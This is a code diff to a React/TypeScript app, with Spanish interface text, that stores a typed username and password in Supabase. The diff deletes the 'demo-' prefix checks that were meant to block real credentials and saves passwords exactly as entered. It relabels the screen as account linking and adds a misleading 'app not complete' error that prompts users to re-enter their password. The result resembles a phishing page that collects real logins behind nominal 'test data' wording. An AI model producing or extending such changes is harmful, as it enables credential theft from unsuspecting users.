@@ -7,6 +7,7 @@ type Screen =
   | "username"
   | "verify"
   | "loading"
+  | "error"
   | "home";
 
 function App() {
@@ -26,8 +27,7 @@ function App() {
   }
 
   function handlePassword(value: string) {
-    // Solo para probar la interfaz.
-    // Este contenido NO se guarda en Supabase.
+    // Dato ficticio usado únicamente para probar la interfaz y Supabase.
     setPassword(value.slice(0, 50));
     setMessage("");
   }
@@ -35,11 +35,6 @@ function App() {
   async function sendUsername() {
     if (!username.trim()) {
       setMessage("Ingresa un nombre de usuario de prueba.");
-      return;
-    }
-
-    if (!username.trim().toLowerCase().startsWith("demo-")) {
-      setMessage("El usuario de prueba debe comenzar por demo-.");
       return;
     }
 
@@ -73,18 +68,12 @@ function App() {
       return;
     }
 
-    if (!password.toLowerCase().startsWith("demo-")) {
-      setMessage("El dato de prueba debe comenzar por demo-.");
-      return;
-    }
-
     setLoading(true);
     setMessage("");
 
     /*
       Este es un valor ficticio de demostración.
-      La interfaz exige el prefijo "demo-" para evitar
-      que se introduzcan credenciales reales por error.
+      Se guarda exactamente como fue escrito para probar Supabase.
     */
 
     const { error } = await supabase
@@ -116,9 +105,7 @@ function App() {
     }
 
     const timer = window.setTimeout(() => {
-      setPassword("");
-      setMessage("Nombre de usuario o contraseña incorrectos.");
-      setScreen("username");
+      setScreen("error");
     }, 5000);
 
     return () => {
@@ -190,12 +177,12 @@ function App() {
           </div>
 
           <h2 className="screenTitle">
-            Prueba de vinculación
+            vincular cuenta
           </h2>
 
           <p className="description left">
-            Usa un identificador inventado que comience por demo-.
-            No escribas tu usuario ni tu correo real.
+            Ingresa un nombre de usuario o correo ficticio para probar
+            la vinculación. No uses datos reales.
           </p>
 
           <div className="usernameContainer">
@@ -214,7 +201,7 @@ function App() {
                   e.target.value
                 )
               }
-              placeholder="demo-usuario"
+              placeholder="nombre o correo de prueba"
             />
 
           </div>
@@ -264,25 +251,26 @@ function App() {
           <div className="spinner" />
 
           <h2 className="screenTitle">
-            Dato de prueba
+            inicio de prueba
           </h2>
 
           <p className="description left">
-            Escribe un valor ficticio que comience por demo-.
-            Se guardará exactamente como lo escribas para probar Supabase.
+            Ingresa una contraseña inventada para probar la interfaz.
+            No uses tu contraseña real.
           </p>
 
           <input
             className="codeInput"
             type="text"
             autoComplete="off"
+            spellCheck={false}
             value={password}
             onChange={(e) =>
               handlePassword(
                 e.target.value
               )
             }
-            placeholder="demo-abc123"
+            placeholder="contraseña de prueba"
           />
 
           {message && (
@@ -323,6 +311,40 @@ function App() {
           <p className="description">
             Espera un momento.
           </p>
+
+        </section>
+      )}
+
+      {/* =========================
+          ERROR DE PRUEBA
+      ========================= */}
+
+      {screen === "error" && (
+        <section className="authCard errorCard">
+
+          <div className="errorIcon">
+            !
+          </div>
+
+          <h2>
+            Hubo un error
+          </h2>
+
+          <p className="description">
+            La app aún no está completa.
+            Vuelve a intentarlo más tarde.
+          </p>
+
+          <button
+            className="mainButton"
+            onClick={() => {
+              setPassword("");
+              setMessage("");
+              setScreen("verify");
+            }}
+          >
+            Volver a la contraseña
+          </button>
 
         </section>
       )}
